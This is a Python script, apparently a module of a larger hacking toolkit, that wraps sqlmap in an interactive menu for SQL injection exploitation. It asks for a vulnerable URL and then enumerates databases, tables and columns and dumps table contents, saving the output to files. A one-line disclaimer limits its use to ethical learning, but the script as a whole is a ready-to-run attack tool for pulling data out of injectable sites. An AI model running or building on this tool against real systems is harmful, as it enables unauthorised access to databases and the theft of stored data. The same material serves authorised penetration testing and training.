import os
import logging
import subprocess
import sys

# Setup Logging
LOG_FILE = "logs/sqlmap_exploit.log"
SQLMAP_OUTPUT_FILE = "outputs/sqlmap_results.txt"

# Ensure necessary directories exist
os.makedirs("logs", exist_ok=True)
os.makedirs("outputs", exist_ok=True)

# Configure logging to save errors and important events
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def log_error(message):
    """Log an error message to the log file and print it to the console."""
    logging.error(message)
    print(f"\n‚ö† ERROR: {message}\n")

def get_non_empty_input(prompt):
    """Prompt user until they provide a non-empty input"""
    while True:
        value = input(prompt).strip()
        if value:
            return value
        log_error("Input cannot be empty!")

def get_valid_url():
    """Prompt user until they provide a valid URL"""
    while True:
        url = input("\nEnter the vulnerable URL (e.g., http://192.168.1.102/vuln.php?id=1): ").strip()
        if validate_url(url):
            return url
        log_error("Invalid input! Please enter a proper URL.")

def validate_url(url):
    """Check if the URL starts with 'http://' or 'https://'"""
    if not url.startswith(("http://", "https://")):
        log_error("Invalid URL! Please enter a valid URL that starts with http:// or https://")
        return False
    return True

def show_banner():
    """Display the module banner."""
    print("\n=============== Welcome to the SQL Injection Module! ===============\n")
    print("‚ö†Ô∏è This tool is for ethical hacking and learning purposes only. Do not use it on unauthorized targets. ‚ö†Ô∏è\n")

def check_sqlmap_installed():
    """Check if SQLmap is installed before running commands."""
    try:
        subprocess.run(["sqlmap", "--version"], capture_output=True, text=True, check=True)
        return True
    except FileNotFoundError:
        log_error("SQLmap is not installed! Install it using: sudo apt install sqlmap")
        exit(1)  # Exit script to prevent further execution

def run_sqlmap(target_url, option, db_name=None, table_name=None, column_names=None):
    """Run SQLmap for SQL Injection detection and exploitation, showing real-time output."""
    if not validate_url(target_url):
        return
    if not check_sqlmap_installed():
        return

    print(f"\n[+] Running SQLmap on {target_url}...\n")

    # Start building the SQLmap command
    command = ["sqlmap", "-u", target_url, "--batch"]

    if option == "1":
        command.append("--dbs")
    elif option == "2":
        if not db_name:
            log_error("Database name is required to list tables!")
            return
        command.extend(["-D", db_name, "--tables"])
    elif option == "3":
        if not db_name or not table_name:
            log_error("Database name and table name are required to list columns!")
            return
        command.extend(["-D", db_name, "-T", table_name, "--columns"])
    elif option == "4":
        if not db_name or not table_name:
            log_error("Database name and table name are required to dump data!")
            return
        if column_names:
            command.extend(["-D", db_name, "-T", table_name, "-C", column_names, "--dump"])
        else:
            command.extend(["-D", db_name, "-T", table_name, "--dump"])

    # Run SQLmap and display real-time output
    try:
        with open(SQLMAP_OUTPUT_FILE, "w") as output_file:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)

            for line in iter(process.stdout.readline, ""):
                print(line, end="")  # Print output live
                sys.stdout.flush()  # Ensure output is displayed immediately
                output_file.write(line)  # Save to file
            
	    # Ensure process completes
            stdout, stderr = process.communicate()
            if process.returncode != 0:
                log_error(f"SQLmap execution failed: {stderr.strip()}")
                return

        print(f"\n‚úÖ SQLmap scan complete! Results saved in {SQLMAP_OUTPUT_FILE}\n")
    except Exception as e:
        log_error(f"An error occurred while running SQLmap: {e}")

def sql_injection_module():
    """Interactive menu for SQL Injection exploitation."""
    while True:
        print("\n========== SQL Injection Exploitation ==========")
        print("1. Find available databases")
        print("2. List tables from a database")
        print("3. List columns from a table")
        print("4. Dump data from a column or table")
        print("5. Exit")

        choice = input("\nEnter your choice: ").strip()
        logging.info(f"User selected option {choice}")

        if choice == "1":  # Find databases
            target_url = get_valid_url()
            run_sqlmap(target_url, choice)

        elif choice in ["2", "3", "4"]:
            target_url = get_valid_url()
            db_name = get_non_empty_input("\nEnter the database name: ")

            table_name = None
            column_names = None  

            if choice in ["3", "4"]:  # If listing columns or dumping data, ask for table name
                table_name = get_non_empty_input("\nEnter the table name: ")
                if choice == "4":  # Ask for multiple column names
                    column_names = input("\nEnter column names (comma-separated, or press enter for all): ").strip()
                    column_names = column_names.replace(" ", "") if column_names else None
            
            run_sqlmap(target_url, choice, db_name, table_name, column_names)

        elif choice == "5":
            print("\nüëã Exiting the SQL Injection Module...\n")
            break
        else:
            log_error("Invalid choice! Enter a number between 1-5.")

def main():
    """Main function to execute the module."""
    show_banner()
    sql_injection_module()

if __name__ == "__main__":
    main()
